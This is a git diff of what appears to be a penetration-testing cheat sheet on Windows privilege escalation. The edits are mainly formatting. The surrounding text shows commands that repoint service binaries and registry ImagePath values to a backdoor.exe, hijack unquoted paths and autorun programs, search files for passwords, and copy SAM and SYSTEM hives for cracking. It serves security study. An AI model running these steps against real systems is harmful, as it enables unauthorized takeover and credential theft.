@@ -25,14 +25,10 @@ classes: wide
 
 
 ## Privilege Escalation Tools
-**PowerUp:**
-[1](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
 
-**SharpUp**
-https://github.com/GhostPack/SharpUp
-
-**WinPeas**
-https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+1. [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
+2. [SharpUp](https://github.com/GhostPack/SharpUp)
+3. [WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 
 ## Kernel Exploit Step
@@ -66,11 +62,13 @@ https://github.com/SecWiki/windows-kernel-exploits
 ## Exploiting Services
 There are Various way to enumerate running services. Services Commands are:
 
+
 **List all services**
 ```bat
 sc queryex type=service state=all #Command shell
 Get-Service #Powershell
 ```
+
 
 **Search for a services**
 ```bat
@@ -78,11 +76,13 @@ sc queryex type=service state=all | find /i "SERVICE_NAME: service_name"
 Get-Service | Where-Object {$_.Name -like "*service_name*"}
 ```
 
+
 **Status of a service**
 ```bat
 sc query service_name
 Get-Service service_name
 ```
+
 
 **List of running services**
 ```bat
@@ -90,15 +90,18 @@ sc queryex type=service
 Get-Service | Where-Object {$_.Status -eq "Running"}
 ```
 
+
 **Modifying Service Properities**
 ```bat
 sc config service_name binpath='c:\windows\temp\backdoor.exe'
 ```
 
+
 **Start and stop Service**
 ```bat
 net start/stop service_name
 ```
+
 
 **Service info With winpeas**
 ```bat
@@ -120,6 +123,7 @@ net start service_name
 ```
 ....**NOTE: if not able to restart the service then, we may need to restart the windows**
 
+
 ### Unquoted Service Path
 Finding Unquoted Service with wmic command:
 ```bat
@@ -139,6 +143,7 @@ copy backdoor.exe "C:\Program Files\Service Path\Vulnerable Service\service_name
 net start service_name
 ```
 
+
 ### Insecure Registry Permission
 If the current can't modify the service directory but has permission to modify it's registry, we can escalate privillege!
 
@@ -156,6 +161,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\srevices\service_name /v ImagePath /t REG_
 net start service_name
 ```
 Reference: ```https://book.hacktricks.xyz/windows/windows-local-privilege-escalation```
+
 
 ### Insecure Service Executeable
 If we can replace the original binary file, we can replace it with our reverse backdoor(Not so common though)
@@ -176,6 +182,7 @@ net start service_name
 
 #or try to execute the program
 ```
+
 
 ## Exploiting Startup Program and AlwaysInstallElevated 
 If we can modify the startup program,we can replace the original program with ours. 
@@ -205,6 +212,7 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 #Replace
 copy C:\PrivEsc\backdoor.exe "C:\Program Files\Autorun Program\program.exe"
 ```
+
 
 2. **AlwaysInstallElevated**
 Using winpeas
@@ -243,6 +251,7 @@ findstr /si password *.xml *.ini *.txt
 .\winPEASany.exe quiet cmd searchfast filesinfo
 ```
 
+
 **SAM and System Backup Files**
 Try to copy these files to local machine and crack
 ```
@@ -254,6 +263,7 @@ C:\Windows\System32\config\SYSTEM
 C:\Windows\System32\config\RegBack\SYSTEM
 ```
 Tools: ```https://github.com/Neohapsis/creddump7.git``` and Hashcat
+
 
 **Search Registry for password**
 ```bat
